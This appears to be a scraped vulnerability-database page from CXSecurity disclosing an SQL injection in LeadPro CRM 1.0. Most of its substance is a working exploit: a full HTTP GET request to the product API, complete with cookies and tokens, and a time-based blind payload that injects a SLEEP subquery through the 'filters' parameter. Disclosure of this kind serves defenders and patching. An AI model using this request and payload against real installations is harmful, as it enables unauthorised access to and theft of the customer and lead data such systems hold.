---
title: LeadPro CRM 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023050057
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-25
fetch_date: 2025-10-04T11:36:45.894922
---

# LeadPro CRM 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LeadPro CRM 1.0 SQL Injection** **2023.05.24**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: LeadPro CRM v1.0 - SQL Injection
# Date: 2023-05-17
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor: https://codecanyon.net/item/leadifly-lead-call-center-crm/43485578
# Demo Site: https://demo.leadifly.in
# Tested on: Kali Linux
# CVE: N/A
### Request ###
GET /api/v1/products?fields=id,xid,name,price,product\_type,tax\_rate,tax\_label,logo,logo\_url&filters=name%20lk%20%22%25aa%25%22&order=id%20desc&offset=0&limit=10
HTTP/1.1
Host: localhost
Cookie:
XSRF-TOKEN=eyJpdiI6Ind6QkVPeUZzKzI3SWlqSnhjQksyK1E9PSIsInZhbHVlIjoiNU1FQzBRR3NJaFFMNXVrOFp6Y3puQjdNT3ZKcSsyYzc0Nllkc1ovbkMzRnJueDZWV1lnZzJ2RmRaZFRobmRRSmUzVFpDS3dhNVhVRS84UXQrd1FrWkFIclR4Z0d3UDk2YjdFS0MxN25aVG5sY2loQjFYVkhrRXdOV2lWM0s4Um4iLCJtYWMiOiI2MjBiMTEwYTY5MWE3YjYyZTRjYmU5MWU0ZTcwZjRmNGI5ZjUxNjZjNjFmMjc1ZDAwOTE1ODM3NzA5YzZkMzQzIiwidGFnIjoiIn0%3D;
leadifly\_session=eyJpdiI6InYyUzVNWkVhVHVrODI2ZTl0a21SNmc9PSIsInZhbHVlIjoiSzNjeDVxYUJRbHZEOVd3Z2I3N2pWa1VrbHdTUUNNSmF6blFEN2E4Q3l5RjJ5WnUxbTdyaFJJN3dCUWhZRklzd3B2OWN5bkZJTnR0RndndGxyNjdRSUp6b2NBV1JhSHFWb211SllzajFkb3JCQmtqSzJEeU9ENDZDWW1jdnF0VHEiLCJtYWMiOiI1YjI1YTdlNjhkMDg4NTQyOGI0ODI0ODI5ZjliNzE0OWExNGUxMWVjYmY2MjM2Y2YyMmNkNjMzYmMzODYwNzE1IiwidGFnIjoiIn0%3D
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:102.0) Gecko/20100101
Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Csrf-Token: kMwvghrsJyPwJ1LGTXnMgMQAtQGA33DzzMYdes6V
Authorization: Bearer
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2RlbW8ubGVhZGlmbHkuaW4vYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODQzMTk3ODAsImV4cCI6MTY4NDM0MTY4MCwibmJmIjoxNjg0MzE5NzgwLCJqdGkiOiJleGJDV2ZmdWhiWTIzRlNqIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.0GcDjE6Q3GYg8PUeJQAXtMET6yAjGh1Bj9joRMoqZo8
X-Xsrf-Token:
eyJpdiI6Ind6QkVPeUZzKzI3SWlqSnhjQksyK1E9PSIsInZhbHVlIjoiNU1FQzBRR3NJaFFMNXVrOFp6Y3puQjdNT3ZKcSsyYzc0Nllkc1ovbkMzRnJueDZWV1lnZzJ2RmRaZFRobmRRSmUzVFpDS3dhNVhVRS84UXQrd1FrWkFIclR4Z0d3UDk2YjdFS0MxN25aVG5sY2loQjFYVkhrRXdOV2lWM0s4Um4iLCJtYWMiOiI2MjBiMTEwYTY5MWE3YjYyZTRjYmU5MWU0ZTcwZjRmNGI5ZjUxNjZjNjFmMjc1ZDAwOTE1ODM3NzA5YzZkMzQzIiwidGFnIjoiIn0=
Referer: https://localhost/admin/product
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
### Parameter & Payloads ###
Parameter: filters (GET)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload:
fields=id,xid,name,price,product\_type,tax\_rate,tax\_label,logo,logo\_url&filters=name
lk "%aa%") AND (SELECT 6593 FROM (SELECT(SLEEP(5)))qBNH) AND
(8549=8549&order=id desc&offset=0&limit=10

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050057)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top